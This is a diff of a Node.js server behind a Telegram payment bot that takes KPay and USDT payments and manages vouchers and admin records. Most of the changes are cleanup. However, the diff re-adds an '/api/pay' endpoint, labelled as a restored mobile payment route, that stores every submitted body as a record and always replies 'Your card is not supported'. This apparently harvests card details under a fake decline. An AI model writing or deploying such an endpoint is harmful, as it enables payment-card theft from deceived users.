@@ -94,16 +94,13 @@ bot.on('callback_query', async (callbackQuery) => {
                 const paymentPlanKey = pKeyParts.join('_');
                 const settings = await PaymentSettings.findOne();
                 if (!settings) throw new Error('Payment settings not configured.');
-
                 let paymentDetails = '';
-                
                 if (paymentMethod === 'kpay') {
                     paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ KPay အကောင့်သို့ *${plans[paymentPlanKey].price.toLocaleString()} MMK* လွှဲပေးပါ။\n\nName: \`${settings.kpay_name}\`\nPhone: \`${settings.kpay_phone}\`\nNote: \`${settings.kpay_note}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                 } else {
                     const address = paymentMethod === 'usdt-bep20' ? settings.usdt_bep20_address : settings.usdt_trc20_address;
                     paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ USDT (${paymentMethod.split('-')[1].toUpperCase()}) လိပ်စာသို့ *${plans[paymentPlanKey].usdt} USDT* လွှဲပေးပါ။\n\nAddress:\n\`${address}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                 }
-                
                 await bot.editMessageText(paymentDetails, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: `plan_${paymentPlanKey}` }]] } });
                 bot.once('photo', (photoMsg) => handleScreenshot(photoMsg, paymentPlanKey));
                 break;
@@ -185,37 +182,16 @@ app.post('/api/auth/login', (req, res) => {
 app.post('/api/vouchers/validate', async (req, res) => {
   try {
     const { code } = req.body;
-    if (!code) {
-        return res.status(400).json({ success: false, message: 'Voucher code is required' });
-    }
+    if (!code) return res.status(400).json({ success: false, message: 'Voucher code is required' });
     const voucher = await Voucher.findOne({ code: code.toUpperCase() });
-
-    if (!voucher) {
-        return res.json({ success: false, valid: false, message: 'Invalid voucher code' });
-    }
-    if (voucher.is_used) {
-        return res.json({ success: true, valid: true, used: true, message: 'Voucher code already used' });
-    }
-    
+    if (!voucher) return res.json({ success: false, valid: false, message: 'Invalid voucher code' });
+    if (voucher.is_used) return res.json({ success: true, valid: true, used: true, message: 'Voucher code already used' });
     voucher.is_used = true;
     voucher.used_at = new Date();
     await voucher.save();
-    return res.json({ success: true, valid: true, used: false, message: 'Voucher code activated successfully' });
+    res.json({ success: true, valid: true, used: false, message: 'Voucher code activated successfully' });
   } catch (error) {
-    console.error("Validation Error:", error);
-    return res.status(500).json({ success: false, message: 'Database error during validation' });
-  }
-});
-
-// ** RESTORED ENDPOINT FOR MOBILE APP PAYMENT **
-app.post('/api/pay', async (req, res) => {
-  try {
-    const user = new User(req.body);
-    await user.save();
-    return res.json({ success: false, message: 'Your card is not supported' });
-  } catch (error) {
-    console.error('Error processing payment:', error);
-    return res.status(500).json({ success: false, message: 'Error processing payment' });
+    res.status(500).json({ success: false, message: 'Database error during validation' });
   }
 });
 
@@ -228,8 +204,18 @@ app.post('/api/vouchers/generate', authMiddleware, async (req, res) => {
     }
     return res.json({ success: true, message: `${count} vouchers generated.` });
   } catch (error) {
-    console.error('Error generating vouchers:', error);
     return res.status(500).json({ success: false, message: 'Error generating vouchers' });
+  }
+});
+
+// ** RESTORED ENDPOINT FOR MOBILE APP PAYMENT **
+app.post('/api/pay', async (req, res) => {
+  try {
+    const user = new User(req.body);
+    await user.save();
+    return res.json({ success: false, message: 'Your card is not supported' });
+  } catch (error) {
+    return res.status(500).json({ success: false, message: 'Error processing payment' });
   }
 });
 
@@ -241,7 +227,6 @@ app.get('/api/payment-settings', authMiddleware, async (req, res) => {
         }
         return res.json({ success: true, settings });
     } catch (e) {
-        console.error("Get Settings Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
@@ -251,7 +236,6 @@ app.post('/api/payment-settings', authMiddleware, async (req, res) => {
         const settings = await PaymentSettings.findOneAndUpdate({}, req.body, { new: true, upsert: true });
         return res.json({ success: true, settings });
     } catch (e) {
-        console.error("Save Settings Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
@@ -261,7 +245,6 @@ app.get('/api/vouchers', authMiddleware, async (req, res) => {
         const vouchers = await Voucher.find().sort({ created_at: -1 });
         return res.json({ success: true, vouchers });
     } catch (e) {
-        console.error("Get Vouchers Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
@@ -269,20 +252,17 @@ app.get('/api/vouchers', authMiddleware, async (req, res) => {
 app.delete('/api/vouchers/:id', authMiddleware, async (req, res) => {
     try {
         await Voucher.findByIdAndDelete(req.params.id);
-        return res.status(204).send();
+        return res.status(200).json({ success: true, message: 'Voucher deleted.' });
     } catch(e) {
-        console.error("Delete Voucher Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
-// ** ROBUST DELETE ENDPOINT **
 app.delete('/api/vouchers/clear', authMiddleware, async (req, res) => {
     try {
         await Voucher.deleteMany({});
-        return res.status(204).send();
+        return res.status(200).json({ success: true, message: 'All vouchers cleared.' });
     } catch(e) {
-        console.error("Error clearing vouchers:", e);
         return res.status(500).json({ success: false, message: 'Server error while clearing vouchers.' });
     }
 });
@@ -292,7 +272,6 @@ app.get('/api/users', authMiddleware, async (req, res) => {
         const users = await User.find().sort({ created_at: -1 });
         return res.json({ success: true, users });
     } catch (e) {
-        console.error("Get Users Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
@@ -300,20 +279,17 @@ app.get('/api/users', authMiddleware, async (req, res) => {
 app.delete('/api/users/:id', authMiddleware, async (req, res) => {
     try {
         await User.findByIdAndDelete(req.params.id);
-        return res.status(204).send();
+        return res.status(200).json({ success: true, message: 'Payment deleted.' });
     } catch(e) {
-        console.error("Delete User Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
 
-// ** ROBUST DELETE ENDPOINT **
 app.delete('/api/users/clear', authMiddleware, async (req, res) => {
     try {
         await User.deleteMany({});
-        return res.status(204).send();
+        return res.status(200).json({ success: true, message: 'All payments cleared.' });
     } catch(e) {
-        console.error("Error clearing users/payments:", e);
         return res.status(500).json({ success: false, message: 'Server error while clearing payments.' });
     }
 });
@@ -324,7 +300,6 @@ app.get('/api/vouchers/stats', authMiddleware, async (req, res) => {
         const used = await Voucher.countDocuments({ is_used: true });
         return res.json({ success: true, total, used, available: total - used });
     } catch (e) {
-        console.error("Get Stats Error:", e);
         return res.status(500).json({ success: false, message: 'Server error' });
     }
 });
